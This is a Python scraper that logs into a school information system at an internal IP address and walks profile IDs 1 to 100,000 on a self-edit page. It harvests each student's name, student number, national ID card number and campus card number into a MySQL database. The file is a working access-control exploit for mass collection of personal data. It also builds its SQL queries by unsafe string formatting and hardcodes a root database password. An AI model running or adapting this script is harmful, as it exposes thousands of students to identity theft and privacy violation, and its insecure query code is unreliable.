import requests
import http.cookiejar
import time
import pymysql
from bs4 import BeautifulSoup
class get_student(object):
    def __init__(self):
        self.session = requests.Session()
    def do_login(self):
        Url = 'http://172.16.50.71/user_login.html'
        headers = {
            'Host': '172.16.50.71',
            'Referer': 'http://172.16.50.71/student_editPageSelf.html?self=self&id=32581',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36'
        }
        post_data = {
            'loginName': 'xxxxxxxxxxx',
            'password': 'xxxxxxxxxxx'
        }
        test = self.session.post(Url, headers=headers, data=post_data)
        # print(test.text)
    def get_text(self):
        headers = {
            'Referer': 'http://172.16.50.71/home_index.html',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36',
        }
        count = 1
        for id in range(1, 100000):
            url = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxx{}'.format(str(id))
            post_data = {
                'self': 'self',
                'id': str(id)
            }
            try:
                res = self.session.get(url, headers=headers, data=post_data)
                dict = self.parse_one_page(res.text)
            except:
                continue
            conn = pymysql.connect(host='127.0.0.1', port=3306, user='root', passwd='1997', db='stu',charset='utf8')
            curr = conn.cursor()
            try:
                sql = "insert into stuinfo values ('%s','%s','%s','%s')" % (dict['sno'], dict['name'], dict['idcard'], dict['schoolid'])
                print(str(count)+'  姓名:'+dict['name']+'学号:'+dict['sno']+'的数据已经保存！')
                count+=1
                curr.execute(sql)
                conn.commit()
                conn.close()
            except:
                print("failed")
        time.sleep(1)


    def parse_one_page(self, response):
        dict = {}
        soup = BeautifulSoup(response, 'lxml')
        sno = soup.select('label')[0].string
        # print(sno)
        snox = soup.select('.InputStyle')[0].attrs['value'] #学号
        # print(snox)
        name = soup.select('label')[1].string
        namex = soup.select('.InputStyle')[1].attrs['value']  # 姓名
        idcard = soup.select('label')[2].string
        idcardx = soup.select('.InputStyle')[2].attrs['value'] # 身份证
        schoolid = soup.select('label')[3].string
        schoolidx = soup.select('.InputStyle')[3].attrs['value']  # 校园卡
        dict = {'sno':snox,'name':namex,'idcard':idcardx,'schoolid':schoolidx}
        return dict

if __name__ == '__main__':
    getimfo = get_student()
    getimfo.do_login()
    getimfo.get_text()
